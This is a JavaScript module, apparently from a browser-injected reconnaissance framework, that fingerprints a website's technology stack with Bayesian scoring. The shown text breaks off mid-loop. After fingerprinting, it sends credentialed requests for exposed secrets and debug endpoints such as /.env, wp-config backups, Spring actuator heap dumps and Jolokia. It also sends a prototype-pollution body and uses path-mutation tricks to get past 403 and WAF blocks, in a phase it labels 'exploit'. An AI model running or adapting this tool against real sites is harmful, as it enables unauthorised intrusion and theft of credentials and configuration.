// language: JavaScript, file: 15_synapse.js, target: modern browsers
// SYNAPSE AI -- probabilistic reasoning engine with active inference

(function () {
  'use strict';
  if (!window.ReconCore) return;
  var core = window.ReconCore;
  var eventBus = core.eventBus;
  var storage = core.storage;
  var scope = core.scope;
  var mods = core.modules = core.modules || {};

  var PRIORS_KEY = 'synapse_priors_v1';
  var FEEDBACK_KEY = 'synapse_feedback_v1';

  // ══════════════════════════════════════════════════════════════
  // LAYER 1 -- PRIORS (base rates)
  // ══════════════════════════════════════════════════════════════
  var BASE_PRIORS = {
    php: 0.30, aspnet: 0.10, node: 0.18, python: 0.08,
    java: 0.12, ruby: 0.04,
    nginx: 0.40, apache: 0.28, iis: 0.08, tomcat: 0.06,
    jetty: 0.03, cloudflare: 0.22, varnish: 0.06, openresty: 0.05,
    wordpress: 0.18, drupal: 0.03, joomla: 0.03, magento: 0.02,
    shopify: 0.05, ghost: 0.01, strapi: 0.01,
    laravel: 0.12, django: 0.06, rails: 0.04, nextjs: 0.10,
    nuxt: 0.03, symfony: 0.04, flask: 0.03, express: 0.15,
    spring: 0.10,
    react: 0.20, vue: 0.15, angular: 0.10, svelte: 0.04
  };

  // ══════════════════════════════════════════════════════════════
  // LAYER 1 -- LIKELIHOOD P(signal | tech)
  // ══════════════════════════════════════════════════════════════
  var LIKELIHOOD = {
    php:            { 'header:x-powered-by:php': 0.95, 'cookie:PHPSESSID': 0.88, 'url:\.php': 0.72 },
    aspnet:         { 'header:x-powered-by:asp.net': 0.95, 'header:x-aspnet-version': 0.92, 'cookie:ASP.NET_SessionId': 0.90, 'url:\.aspx?': 0.75 },
    node:           { 'header:x-powered-by:express': 0.95, 'cookie:connect.sid': 0.85, 'header:x-powered-by:node': 0.90 },
    express:        { 'header:x-powered-by:express': 0.95, 'cookie:connect.sid': 0.80 },
    python:         { 'header:server:gunicorn': 0.85, 'header:server:werkzeug': 0.85, 'cookie:session=.*': 0.55, 'url:\.py': 0.70 },
    flask:          { 'header:server:werkzeug': 0.92, 'cookie:session=.*': 0.60 },
    django:         { 'cookie:sessionid': 0.85, 'cookie:csrftoken': 0.70, 'url:admin/login': 0.40 },
    java:           { 'cookie:JSESSIONID': 0.90, 'url:\.jsp': 0.80, 'url:\.do': 0.75, 'header:server:tomcat': 0.85 },
    tomcat:         { 'header:server:tomcat': 0.95, 'cookie:JSESSIONID': 0.70 },
    jetty:          { 'header:server:jetty': 0.95, 'cookie:JSESSIONID': 0.60 },
    spring:         { 'header:x-application-context': 0.65, 'url:actuator/': 0.30 },
    ruby:           { 'cookie:_rails': 0.85, 'header:x-powered-by:phusion': 0.95 },
    rails:          { 'cookie:_rails': 0.90, 'header:x-powered-by:phusion': 0.90 },
    nginx:          { 'header:server:nginx': 0.95, 'header:server:openresty': 0.60 },
    apache:         { 'header:server:apache': 0.95 },
    iis:            { 'header:server:microsoft-iis': 0.98 },
    cloudflare:     { 'header:server:cloudflare': 0.98, 'header:cf-ray': 0.98, 'cookie:cf_clearance': 0.95, 'cookie:__cf_bm': 0.90 },
    wordpress:      { 'html:wp-content': 0.95, 'html:wp-includes': 0.95, 'cookie:wordpress_': 0.90, 'url:wp-json': 0.85, 'url:wp-login': 0.92 },
    drupal:         { 'html:drupal': 0.85, 'url:core/CHANGELOG': 0.90 },
    joomla:         { 'html:joomla': 0.85, 'url:administrator/': 0.40 },
    magento:        { 'html:mage/cookies': 0.90, 'cookie:frontend=': 0.55 },
    shopify:        { 'html:cdn\.shopify\.com': 0.95, 'header:x-shopid': 0.98 },
    ghost:          { 'html:ghost.org': 0.85, 'header:x-powered-by:ghost': 0.92 },
    strapi:         { 'html:strapi': 0.80, 'header:x-powered-by:strapi': 0.92 },
    laravel:        { 'cookie:laravel_session': 0.92, 'cookie:xsrf-token': 0.60, 'html:laravel': 0.55 },
    symfony:        { 'header:x-debug-token': 0.90, 'cookie:sf_redirect': 0.70 },
    nextjs:         { 'html:__NEXT_DATA__': 0.95, 'html:_next/': 0.85, 'header:x-nextjs': 0.90 },
    nuxt:           { 'html:__NUXT__': 0.95, 'html:_nuxt/': 0.85 },
    react:          { 'html:data-reactroot': 0.80, 'html:__REACT_DEVTOOLS': 0.70 },
    vue:            { 'html:data-v-[a-f0-9]': 0.85, 'html:ng-': 0.05 },
    angular:        { 'html:ng-version': 0.92, 'html:ng-app': 0.85 },
    svelte:         { 'html:__sveltekit': 0.92, 'html:data-svelte': 0.85 }
  };

  // ══════════════════════════════════════════════════════════════
  // LAYER 3 -- MARKOV propagation P(B | A)
  // ══════════════════════════════════════════════════════════════
  var MARKOV = {
    wordpress: { php: 0.98, apache: 0.50, nginx: 0.45, mysql: 0.90 },
    laravel:   { php: 0.99, composer: 0.95, symfony: 0.55 },
    symfony:   { php: 0.99, composer: 0.90 },
    drupal:    { php: 0.98, mysql: 0.85 },
    joomla:    { php: 0.98, mysql: 0.85 },
    magento:   { php: 0.98, mysql: 0.90 },
    ghost:     { node: 0.95 },
    strapi:    { node: 0.95, react: 0.65 },
    express:   { node: 0.98 },
    nextjs:    { node: 0.90, react: 0.95 },
    nuxt:      { node: 0.90, vue: 0.95 },
    svelte:    { node: 0.75 },
    rails:     { ruby: 0.98 },
    django:    { python: 0.98 },
    flask:     { python: 0.98 },
    spring:    { java: 0.98 },
    tomcat:    { java: 0.90, apache: 0.35 },
    jetty:     { java: 0.92 },
    shopify:   { ruby: 0.45, nginx: 0.35 }
  };

  // ══════════════════════════════════════════════════════════════
  // ACTIVE PROBES -- picked by information gain
  // ══════════════════════════════════════════════════════════════
  var PROBES = [
    { id: 'p-wp-json',      tech: 'wordpress', path: '/wp-json/',                  match: function(r, b) { return r === 200 && /"name"|"routes"/.test(b); } },
    { id: 'p-wp-login',     tech: 'wordpress', path: '/wp-login.php',              match: function(r, b) { return r === 200 && /wp-submit|wordpress/i.test(b); } },
    { id: 'p-dru-chlog',    tech: 'drupal',    path: '/CHANGELOG.txt',             match: function(r, b) { return r === 200 && /Drupal/i.test(b); } },
    { id: 'p-joo-admin',    tech: 'joomla',    path: '/administrator/',            match: function(r, b) { return r === 200 && /joomla|Joomla/i.test(b); } },
    { id: 'p-php-info',     tech: 'php',       path: '/phpinfo.php',               match: function(r, b) { return r === 200 && /phpinfo|PHP Version/i.test(b); } },
    { id: 'p-lar-tel',      tech: 'laravel',   path: '/telescope',                 match: function(r, b) { return r === 200 && /telescope/i.test(b); } },
    { id: 'p-lar-env',      tech: 'laravel',   path: '/.env',                      match: function(r, b) { return r === 200 && /APP_|DB_|SECRET_/.test(b); } },
    { id: 'p-sym-prof',     tech: 'symfony',   path: '/_profiler',                 match: function(r, b) { return r === 200 && /profiler/i.test(b); } },
    { id: 'p-spr-act',      tech: 'spring',    path: '/actuator',                  match: function(r, b) { return r === 200 && /_links|actuator/.test(b); } },
    { id: 'p-spr-env',      tech: 'spring',    path: '/actuator/env',              match: function(r, b) { return r === 200 && /activeProfiles|propertySources/.test(b); } },
    { id: 'p-asp-trace',    tech: 'aspnet',    path: '/trace.axd',                 match: function(r, b) { return r === 200 && /trace|application/i.test(b); } },
    { id: 'p-iis-page',     tech: 'iis',       path: '/iisstart.htm',              match: function(r, b) { return r === 200 && /iisstart|Microsoft IIS/i.test(b); } },
    { id: 'p-rai-info',     tech: 'rails',     path: '/rails/info/properties',     match: function(r, b) { return r === 200; } },
    { id: 'p-dja-debug',    tech: 'django',    path: '/__debug__/',                match: function(r, b) { return r === 200 && /debug/i.test(b); } },
    { id: 'p-nx-data',      tech: 'nextjs',    path: '/_next/data/',               match: function(r, b) { return r >= 200 && r < 500; } },
    { id: 'p-vu-nuxt',      tech: 'nuxt',      path: '/_nuxt/',                    match: function(r, b) { return r >= 200 && r < 500; } },
    { id: 'p-gh-admin',     tech: 'ghost',     path: '/ghost/',                    match: function(r, b) { return r === 200 && /ghost/i.test(b); } },
    { id: 'p-str-admin',    tech: 'strapi',    path: '/admin/init',                match: function(r, b) { return r === 200 && /strapi/i.test(b); } },
    { id: 'p-sho-prod',     tech: 'shopify',   path: '/products.json',             match: function(r, b) { return r === 200 && /"products"/.test(b); } },
    { id: 'p-node-pkg',     tech: 'node',      path: '/package.json',              match: function(r, b) { return r === 200 && /"name"|"dependencies"/.test(b); } },
    { id: 'p-exp-proto',    tech: 'express',   path: '/?__proto__[probe]=1',       match: function(r, b) { return r >= 200 && r < 500; } },
    { id: 'p-jolokia',      tech: 'java',      path: '/jolokia/list',              match: function(r, b) { return r === 200 && /jolokia|mbean/i.test(b); } }
  ];

  // ══════════════════════════════════════════════════════════════
  // PAYLOADS by technology (only used after high confidence)
  // ══════════════════════════════════════════════════════════════
  var PAYLOADS = {
    wordpress: [
      { method: 'GET', path: '/wp-json/wp/v2/users', tags: ['user-enum'] },
      { method: 'POST', path: '/xmlrpc.php',
        body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
        headers: { 'Content-Type': 'text/xml' }, tags: ['xmlrpc'] },
      { method: 'GET', path: '/wp-config.php.bak', tags: ['backup'] },
      { method: 'GET', path: '/wp-content/debug.log', tags: ['log'] }
    ],
    laravel: [
      { method: 'GET', path: '/telescope/requests', tags: ['debug-tool'] },
      { method: 'GET', path: '/_ignition/health-check', tags: ['ignition'] },
      { method: 'GET', path: '/storage/logs/laravel.log', tags: ['log'] },
      { method: 'GET', path: '/_debugbar/open', tags: ['debugbar'] }
    ],
    spring: [
      { method: 'GET', path: '/actuator/env', tags: ['env'] },
      { method: 'GET', path: '/actuator/heapdump', tags: ['heap'] },
      { method: 'GET', path: '/actuator/mappings', tags: ['mappings'] },
      { method: 'GET', path: '/jolokia/list', tags: ['jolokia'] }
    ],
    aspnet: [
      { method: 'GET', path: '/trace.axd', tags: ['trace'] },
      { method: 'GET', path: '/elmah.axd', tags: ['elmah'] },
      { method: 'GET', path: '/web.config', tags: ['config'] }
    ],
    django: [
      { method: 'GET', path: '/admin/', tags: ['admin'] },
      { method: 'GET', path: '/__debug__/', tags: ['debug'] },
      { method: 'GET', path: '/static/admin/css/base.css', tags: ['static'] }
    ],
    rails: [
      { method: 'GET', path: '/rails/info/routes', tags: ['routes'] },
      { method: 'GET', path: '/rails/info/properties', tags: ['props'] }
    ],
    drupal: [
      { method: 'GET', path: '/core/CHANGELOG.txt', tags: ['version'] },
      { method: 'GET', path: '/user/login', tags: ['login'] }
    ],
    joomla: [
      { method: 'GET', path: '/administrator/manifests/files/joomla.xml', tags: ['version'] }
    ],
    node: [
      { method: 'GET', path: '/package.json', tags: ['manifest'] },
      { method: 'POST', path: '/', body: '{"__proto__":{"polluted":true}}',
        headers: { 'Content-Type': 'application/json' }, tags: ['proto'] }
    ],
    php: [
      { method: 'GET', path: '/.env', tags: ['env'] },
      { method: 'GET', path: '/adminer.php', tags: ['adminer'] },
      { method: 'GET', path: '/server-status', tags: ['status'] }
    ]
  };

  // ══════════════════════════════════════════════════════════════
  // PERSISTENT LEARNING
  // ══════════════════════════════════════════════════════════════
  function loadPriors() {
    try {
      var raw = localStorage.getItem(PRIORS_KEY);
      return raw ? JSON.parse(raw) : {};
    } catch (e) { return {}; }
  }
  function savePriors(obj) {
    try { localStorage.setItem(PRIORS_KEY, JSON.stringify(obj)); } catch (e) {}
  }
  function loadFeedback() {
    try {
      var raw = localStorage.getItem(FEEDBACK_KEY);
      return raw ? JSON.parse(raw) : { probes: {}, targets: 0 };
    } catch (e) { return { probes: {}, targets: 0 }; }
  }
  function saveFeedback(obj) {
    try { localStorage.setItem(FEEDBACK_KEY, JSON.stringify(obj)); } catch (e) {}
  }

  function adjustedPrior(tech) {
    var learned = loadPriors();
    var base = BASE_PRIORS[tech] || 0.05;
    var hits = (learned[tech] && learned[tech].hits) || 0;
    var misses = (learned[tech] && learned[tech].misses) || 0;
    if (hits + misses < 3) return base;
    var observed = hits / (hits + misses);
    return (base * 0.4) + (observed * 0.6);
  }

  function recordFeedback(tech, correct) {
    var learned = loadPriors();
    if (!learned[tech]) learned[tech] = { hits: 0, misses: 0 };
    if (correct) learned[tech].hits++;
    else learned[tech].misses++;
    savePriors(learned);
  }

  function probeSuccess(probeId, ok) {
    var fb = loadFeedback();
    if (!fb.probes[probeId]) fb.probes[probeId] = { ok: 0, fail: 0 };
    if (ok) fb.probes[probeId].ok++;
    else fb.probes[probeId].fail++;
    saveFeedback(fb);
  }

  function probeWeight(probeId) {
    var fb = loadFeedback();
    var p = fb.probes[probeId];
    if (!p || p.ok + p.fail < 5) return 1.0;
    return 0.5 + (p.ok / (p.ok + p.fail)) * 1.0;
  }

  // ══════════════════════════════════════════════════════════════
  // LAYER 2 -- BAYESIAN INFERENCE
  // ══════════════════════════════════════════════════════════════
  function matchSignalKey(observed) {
    // Turn observed signal object into keys for likelihood lookup
    var keys = [];
    Object.keys(observed).forEach(function (fullKey) {
      // fullKey format: "type:subkey:value" or "cookie:NAME"
      keys.push(fullKey);
    });
    return keys;
  }

  function checkPattern(pattern, key) {
    try { return new RegExp(pattern, 'i').test(key); }
    catch (e) { return false; }
  }

  function naiveBayes(observed) {
    var techs = Object.keys(BASE_PRIORS);
    var posteriors = {};

    // log-space computation for numerical stability
    var logPost = {};
    var maxLog = -Infinity;

    techs.forEach(function (tech) {
      var p0 = adjustedPrior(tech);
      var logP = Math.log(p0);
      var lik = LIKELIHOOD[tech] || {};

      Object.keys(lik).forEach(function (sig) {
        // does any observed key match this signal pattern?
        var matched = Object.keys(observed).some(function (k) {
          return checkPattern(sig, k);
        });
        var condProb = lik[sig];
        if (matched) {
          logP += Math.log(Math.max(condProb, 0.001));
        } else {
          // absence of signal is weak evidence
          logP += Math.log(Math.max(1 - condProb * 0.15, 0.001));
        }
      });

      logPost[tech] = logP;
      if (logP > maxLog) maxLog = logP;
    });

    // normalize in log space
    var sumExp = 0;
    Object.keys(logPost).forEach(function (t) {
      logPost[t] -= maxLog;
      sumExp += Math.exp(logPost[t]);
    });
    Object.keys(logPost).forEach(function (t) {
      posteriors[t] = Math.exp(logPost[t]) / sumExp;
    });

    return posteriors;
  }

  // ══════════════════════════════════════════════════════════════
  // LAYER 3 -- MARKOV PROPAGATION
  // ══════════════════════════════════════════════════════════════
  function propagate(posteriors) {
    var out = Object.assign({}, posteriors);
    Object.keys(posteriors).forEach(function (tech) {
      var prob = posteriors[tech];
      if (prob < 0.15) return; // only propagate from confident nodes
      var edges = MARKOV[tech];
      if (!edges) return;
      Object.keys(edges).forEach(function (child) {
        var edgeP = edges[child];
        // P(child |= parent) update -- soft propagation
        var boost = prob * edgeP * 0.5;
        out[child] = Math.min(0.99, (out[child] || 0) + boost);
      });
    });
    // renormalize
    var sum = 0;
    Object.keys(out).forEach(function (t) { sum += out[t]; });
    if (sum > 0) {
      Object.keys(out).forEach(function (t) { out[t] = out[t] / sum; });
    }
    return out;
  }

  // ══════════════════════════════════════════════════════════════
  // LAYER 4 -- ENTROPY
  // ══════════════════════════════════════════════════════════════
  function entropy(posteriors) {
    var h = 0;
    Object.keys(posteriors).forEach(function (t) {
      var p = posteriors[t];
      if (p > 0.0001) h -= p * Math.log2(p);
    });
    return h;
  }

  // ══════════════════════════════════════════════════════════════
  // LAYER 5 -- INFORMATION GAIN
  // ══════════════════════════════════════════════════════════════
  function informationGain(posteriors, probe) {
    var targetTech = probe.tech;
    var pTech = posteriors[targetTech] || 0.01;

    // H(T) before
    var hBefore = entropy(posteriors);

    // If probe fires (match), posterior sharpens:
    var pAfterYes = {};
    Object.keys(posteriors).forEach(function (t) {
      pAfterYes[t] = t === targetTech ? 0.90 : posteriors[t] * 0.15;
    });
    var sumYes = 0;
    Object.keys(pAfterYes).forEach(function (t) { sumYes += pAfterYes[t]; });
    Object.keys(pAfterYes).forEach(function (t) { pAfterYes[t] /= sumYes; });

    // If probe fails, we discount target:
    var pAfterNo = {};
    Object.keys(posteriors).forEach(function (t) {
      pAfterNo[t] = t === targetTech ? posteriors[t] * 0.20 : posteriors[t] * 1.05;
    });
    var sumNo = 0;
    Object.keys(pAfterNo).forEach(function (t) { sumNo += pAfterNo[t]; });
    Object.keys(pAfterNo).forEach(function (t) { pAfterNo[t] /= sumNo; });

    var hYes = entropy(pAfterYes);
    var hNo = entropy(pAfterNo);

    // Probability probe fires ~ scaled by pTech and its learned weight
    var pFire = Math.min(0.95, pTech * probeWeight(probe.id));
    var expectedAfter = pFire * hYes + (1 - pFire) * hNo;

    return hBefore - expectedAfter;
  }

  function selectNextProbes(posteriors, n) {
    n = n || 5;
    var scored = PROBES.map(function (p) {
      return { probe: p, gain: informationGain(posteriors, p) };
    });
    scored.sort(function (a, b) { return b.gain - a.gain; });
    return scored.slice(0, n);
  }

  // ══════════════════════════════════════════════════════════════
  // LAYER 6 -- MUTATION ENGINE
  // ══════════════════════════════════════════════════════════════
  function mutate(path) {
    var out = [path];
    if (path.charAt(0) === '/') {
      var bare = path.slice(1);
      out.push('/' + bare + '/');
      out.push('//' + bare);
      out.push('/./' + bare);
      out.push('/' + bare + '/.');
      out.push('/' + bare + '..;/');
      out.push('/%2e/' + bare);
      out.push('/' + bare.replace(/\./g, '%2e'));
      out.push('/' + bare.toUpperCase());
      if (bare.indexOf('?') === -1) out.push('/' + bare + '?');
    }
    var seen = {};
    return out.filter(function (x) {
      if (seen[x]) return false;
      seen[x] = true;
      return true;
    });
  }

  function shouldMutate(result) {
    // Mutate when response is ambiguous
    if (result.status === 0) return false;
    if (result.status === 404) return true;
    if (result.status === 403) return true; // WAF or auth -- try bypass
    if (result.status >= 300 && result.status < 400) return true; // redirect
    return false;
  }

  // ══════════════════════════════════════════════════════════════
  // LAYER 7 -- ANOMALY DETECTOR
  // ══════════════════════════════════════════════════════════════
  async function sampleBaseline(n) {
    n = n || 5;
    var samples = [];
    for (var i = 0; i < n; i++) {
      var rand = '/__synapse_' + Math.random().toString(36).slice(2, 10) + '__';
      try {
        var t0 = Date.now();
        var r = await fetch(rand, { credentials: 'include', redirect: 'manual' });
        var txt = '';
        try { txt = await r.text(); } catch (e) {}
        samples.push({ status: r.status, len: txt.length, ms: Date.now() - t0 });
      } catch (e) {
        samples.push({ status: 0, len: 0, ms: 0 });
      }
      await new Promise(function (res) { setTimeout(res, 150); });
    }
    var lenSum = 0;
    samples.forEach(function (s) { lenSum += s.len; });
    var mean = lenSum / samples.length;
    var varSum = 0;
    samples.forEach(function (s) { varSum += Math.pow(s.len - mean, 2); });
    var sd = Math.sqrt(varSum / samples.length) || 1;

    var statusSum = 0;
    samples.forEach(function (s) { statusSum += s.status; });
    var statusMode = mode(samples.map(function (s) { return s.status; }));

    return { mean: mean, sd: sd, samples: samples, statusMode: statusMode };
  }

  function mode(arr) {
    var counts = {};
    var best = null;
    var bestCount = 0;
    arr.forEach(function (x) {
      counts[x] = (counts[x] || 0) + 1;
      if (counts[x] > bestCount) { bestCount = counts[x]; best = x; }
    });
    return best;
  }

  function zScore(value, baseline) {
    if (!baseline || baseline.sd === 0) return 0;
    return (value - baseline.mean) / baseline.sd;
  }

  function isAnomaly(result, baseline) {
    if (!baseline) return false;
    if (result.status !== baseline.statusMode && result.status !== 0) return true;
    var z = Math.abs(zScore(result.len, baseline));
    if (z > 3) return true;
    return false;
  }

  // ══════════════════════════════════════════════════════════════
  // SIGNAL EXTRACTION
  // ══════════════════════════════════════════════════════════════
  async function extractSignals() {
    var observed = {};
    function add(key) { observed[key] = (observed[key] || 0) + 1; }

    // From probes headers
    var meta = [];
    try { meta = await storage.getAll('meta'); } catch (e) {}
    meta.forEach(function (m) {
      if (m.kind !== 'endpoint-probe') return;
      var hdrs = m.headers || {};
      Object.keys(hdrs).forEach(function (k) {
        var v = String(hdrs[k] || '').toLowerCase();
        add('header:' + k.toLowerCase() + ':' + v);
        // generic value patterns
        if (/php/.test(v)) add('header:' + k.toLowerCase() + ':php');
        if (/nginx/.test(v)) add('header:' + k.toLowerCase() + ':nginx');
        if (/apache/.test(v)) add('header:' + k.toLowerCase() + ':apache');
        if (/iis|microsoft-iis/.test(v)) add('header:' + k.toLowerCase() + ':microsoft-iis');
        if (/tomcat/.test(v)) add('header:' + k.toLowerCase() + ':tomcat');
        if (/jetty/.test(v)) add('header:' + k.toLowerCase() + ':jetty');
        if (/express/.test(v)) add('header:' + k.toLowerCase() + ':express');
        if (/cloudflare/.test(v)) add('header:' + k.toLowerCase() + ':cloudflare');
        if (/openresty/.test(v)) add('header:' + k.toLowerCase() + ':openresty');
        if (/gunicorn/.test(v)) add('header:' + k.toLowerCase() + ':gunicorn');
        if (/werkzeug/.test(v)) add('header:' + k.toLowerCase() + ':werkzeug');
      });
      if (m.headers && m.headers['cf-ray']) add('header:cf-ray');
      if (m.headers && m.headers['x-debug-token']) add('header:x-debug-token');
    });

    // From URLs
    try {
      var net = await storage.getAll('network');
      net.forEach(function (n) {
        var u = n.url || '';
        if (/\.php(\?|$)/.test(u)) add('url:\\.php');
        if (/\.aspx?(\?|$)/.test(u)) add('url:\\.aspx?');
        if (/\.jsp(\?|$)/.test(u)) add('url:\\.jsp');
        if (/\.do(\?|$)/.test(u)) add('url:\\.do');
        if (/\.py(\?|$)/.test(u)) add('url:\\.py');
        if (/wp-json/.test(u)) add('url:wp-json');
        if (/wp-login/.test(u)) add('url:wp-login');
        if (/actuator/.test(u)) add('url:actuator/');
      });
    } catch (e) {}

    // From cookies
    try {
      var cks = await storage.getAll('cookies');
      cks.forEach(function (c) {
        var name = c.name || '';
        if (/^PHPSESSID$/i.test(name)) add('cookie:PHPSESSID');
        if (/^JSESSIONID$/i.test(name)) add('cookie:JSESSIONID');
        if (/^ASP\.NET_SessionId$/i.test(name)) add('cookie:ASP.NET_SessionId');
        if (/^connect\.sid$/i.test(name)) add('cookie:connect.sid');
        if (/^sessionid$/i.test(name)) add('cookie:sessionid');
        if (/^csrftoken$/i.test(name)) add('cookie:csrftoken');
        if (/^_rails/i.test(name)) add('cookie:_rails');
        if (/^laravel_session$/i.test(name)) add('cookie:laravel_session');
        if (/^xsrf-token$/i.test(name)) add('cookie:xsrf-token');
        if (/^cf_clearance$/i.test(name)) add('cookie:cf_clearance');
        if (/^__cf_bm$/i.test(name)) add('cookie:__cf_bm');
        if (/^wordpress_/i.test(name)) add('cookie:wordpress_');
        if (/^sf_redirect$/i.test(name)) add('cookie:sf_redirect');
        if (/^session=/i.test(name)) add('cookie:session=.*');
      });
    } catch (e) {}

    // From live cookies
    try {
      document.cookie.split(';').forEach(function (c) {
        var name = c.split('=')[0].trim();
        if (/^PHPSESSID$/i.test(name)) add('cookie:PHPSESSID');
        if (/^JSESSIONID$/i.test(name)) add('cookie:JSESSIONID');
      });
    } catch (e) {}

    // From live DOM
    try {
      var html = document.documentElement ? document.documentElement.innerHTML : '';
      if (html) {
        if (/wp-content|wp-includes/i.test(html)) add('html:wp-content');
        if (/drupal/i.test(html)) add('html:drupal');
        if (/joomla/i.test(html)) add('html:joomla');
        if (/__NEXT_DATA__/i.test(html)) add('html:__NEXT_DATA__');
        if (/_next\//i.test(html)) add('html:_next/');
        if (/__NUXT__/i.test(html)) add('html:__NUXT__');
        if (/_nuxt\//i.test(html)) add('html:_nuxt/');
        if (/ng-version/i.test(html)) add('html:ng-version');
        if (/ng-app/i.test(html)) add('html:ng-app');
        if (/data-v-[a-f0-9]{8}/i.test(html)) add('html:data-v-[a-f0-9]');
        if (/data-reactroot/i.test(html)) add('html:data-reactroot');
        if (/__REACT_DEVTOOLS/i.test(html)) add('html:__REACT_DEVTOOLS');
        if (/cdn\.shopify\.com/i.test(html)) add('html:cdn\\.shopify\\.com');
        if (/ghost\.org/i.test(html)) add('html:ghost.org');
        if (/strapi/i.test(html)) add('html:strapi');
        if (/__sveltekit/i.test(html)) add('html:__sveltekit');
        if (/data-svelte/i.test(html)) add('html:data-svelte');
        if (/laravel/i.test(html)) add('html:laravel');
      }
    } catch (e) {}

    return observed;
  }

  // ══════════════════════════════════════════════════════════════
  // EXECUTE PROBE
  // ══════════════════════════════════════════════════════════════
  async function execProbe(p) {
    var url = location.origin + p.path;
    var t0 = Date.now();
    var result = { id: p.id, tech: p.tech, url: url, status: 0, len: 0, ms: 0, fired: false };

    try {
      var r = await fetch(url, { method: 'GET', credentials: 'include', redirect: 'manual' });
      result.status = r.status;
      result.ms = Date.now() - t0;
      var body = '';
      try { body = await r.text(); } catch (e) {}
      result.len = body.length;
      try { result.fired = !!p.match(r.status, body); } catch (e) { result.fired = false; }
    } catch (e) {
      result.error = e.message;
    }

    probeSuccess(p.id, result.fired);

    try {
      await storage.put('meta', {
        kind: 'synapse-probe',
        probeId: p.id,
        tech: p.tech,
        url: url,
        status: result.status,
        len: result.len,
        ms: result.ms,
        fired: result.fired
      }, 'synpr::' + storage.hashKey(p.id + '::' + p.path));
    } catch (e) {}

    return result;
  }

  // ══════════════════════════════════════════════════════════════
  // EXECUTE PAYLOAD
  // ══════════════════════════════════════════════════════════════
  async function execPayload(payload, tech, baseline) {
    var url = location.origin + payload.path;
    var result = {
      tech: tech, url: url, method: payload.method || 'GET',
      tags: payload.tags || [], status: 0, len: 0, ms: 0,
      interesting: false, signals: []
    };
    var t0 = Date.now();
    try {
      var opts = { method: payload.method || 'GET', credentials: 'include', redirect: 'manual' };
      if (payload.headers) opts.headers = payload.headers;
      if (payload.body) opts.body = payload.body;
      var r = await fetch(url, opts);
      result.status = r.status;
      result.ms = Date.now() - t0;
      var body = '';
      try { body = await r.text(); } catch (e) {}
      result.len = body.length;

      if (isAnomaly(result, baseline)) {
        result.interesting = true; result.signals.push('anomaly');
      }
      if (/stack trace|traceback|syntax error|on line \d+/i.test(body)) {
        result.interesting = true; result.signals.push('stack-trace');
      }
      if (/root:.*:0:0:/i.test(body)) {
        result.interesting = true; result.signals.push('lfi-confirmed');
      }
      if (/<methodResponse>|<methodName>/i.test(body)) {
        result.interesting = true; result.signals.push('xmlrpc-open');
      }
      if (/activeProfiles|propertySources/i.test(body)) {
        result.interesting = true; result.signals.push('spring-env-leaked');
      }
      if (/APP_|DB_|SECRET_|AWS_/i.test(body) && /\.env/i.test(payload.path)) {
        result.interesting = true; result.signals.push('env-leaked');
      }
      if (/jolokia|mbean/i.test(body)) {
        result.interesting = true; result.signals.push('jolokia-open');
      }
      if (/telescope|ignition/i.test(body)) {
        result.interesting = true; result.signals.push('laravel-tools');
      }
    } catch (e) { result.error = e.message; }

    try {
      await storage.put('meta', {
        kind: 'synapse-payload',
        tech: tech, url: url, method: result.method,
        tags: result.tags, status: result.status, len: result.len,
        interesting: result.interesting, signals: result.signals
      }, 'synpl::' + storage.hashKey(url + '::' + result.method));
    } catch (e) {}

    if (result.interesting) {
      eventBus.emit('synapse:hit', { tech: tech, result: result });
    }
    return result;
  }

  // ══════════════════════════════════════════════════════════════
  // THE LOOP -- observe → infer → test → update
  // ══════════════════════════════════════════════════════════════
  var running = false;
  var stats = { probes: 0, payloads: 0, hits: 0, iterations: 0 };
  var MAX_ITERATIONS = 3;
  var CONFIDENCE_THRESHOLD = 0.55;

  async function run(opts) {
    opts = opts || {};
    if (running) return { ok: false, reason: 'already running' };
    running = true;

    try {
      // 1. Baseline for anomaly detection
      eventBus.emit('synapse:phase', { phase: 'baseline' });
      var baseline = await sampleBaseline(5);

      // 2. Extract signals
      eventBus.emit('synapse:phase', { phase: 'perception' });
      var observed = await extractSignals();

      // 3. Bayesian inference
      eventBus.emit('synapse:phase', { phase: 'inference' });
      var posteriors = naiveBayes(observed);
      var propagated = propagate(posteriors);

      var iterations = 0;
      var allProbeResults = [];

      // 4. Active inference loop
      while (iterations < MAX_ITERATIONS && running) {
        iterations++;
        stats.iterations = iterations;

        var uncertain = Object.keys(propagated).filter(function (t) {
          var p = propagated[t];
          return p > 0.15 && p < 0.90;
        });

        if (!uncertain.length) break;

        var probes = selectNextProbes(propagated, opts.probesPerIteration || 3);
        if (!probes.length || probes[0].gain < 0.05) break;

        eventBus.emit('synapse:phase', { phase: 'probing', iteration: iterations, selected: probes.map(function (x) { return x.probe.id; }) });

        for (var i = 0; i < probes.length && running; i++) {
          stats.probes++;
          var r = await execProbe(probes[i].probe);
          allProbeResults.push(r);

          // Update posteriors based on probe result
          if (r.fired) {
            var tech = probes[i].probe.tech;
            Object.keys(propagated).forEach(function (t) {
              if (t === tech) propagated[t] = Math.min(0.99, propagated[t] * 4);
              else propagated[t] = propagated[t] * 0.5;
            });
          } else {
            var tech2 = probes[i].probe.tech;
            propagated[tech2] = propagated[tech2] * 0.15;
          }

          // Renormalize
          var sum = 0;
          Object.keys(propagated).forEach(function (t) { sum += propagated[t]; });
          if (sum > 0) {
            Object.keys(propagated).forEach(function (t) { propagated[t] = propagated[t] / sum; });
          }

          // Re-propagate markov
          propagated = propagate(propagated);

          eventBus.emit('synapse:progress', {
            phase: 'probe',
            probe: r.id,
            fired: r.fired,
            topTechs: topN(propagated, 5)
          });

          await new Promise(function (res) { setTimeout(res, 400 + Math.random() * 300); });
        }
      }

      // 5. Extract high-confidence techs and run their payloads
      var confident = Object.keys(propagated)
        .filter(function (t) { return propagated[t] >= CONFIDENCE_THRESHOLD; })
        .filter(function (t) { return !!PAYLOADS[t]; })
        .sort(function (a, b) { return propagated[b] - propagated[a]; });

      // Also include techs that got probes fired directly
      allProbeResults.forEach(function (pr) {
        if (pr.fired && PAYLOADS[pr.tech] && confident.indexOf(pr.tech) === -1) {
          confident.push(pr.tech);
        }
      });

      eventBus.emit('synapse:phase', { phase: 'exploit', confident: confident });

      // 6. Execute payloads for confident techs
      for (var k = 0; k < confident.length && running; k++) {
        var tech = confident[k];
        var payloads = PAYLOADS[tech] || [];
        for (var j = 0; j < payloads.length && running; j++) {
          stats.payloads++;
          var pres = await execPayload(payloads[j], tech, baseline);
          if (pres.interesting) stats.hits++;
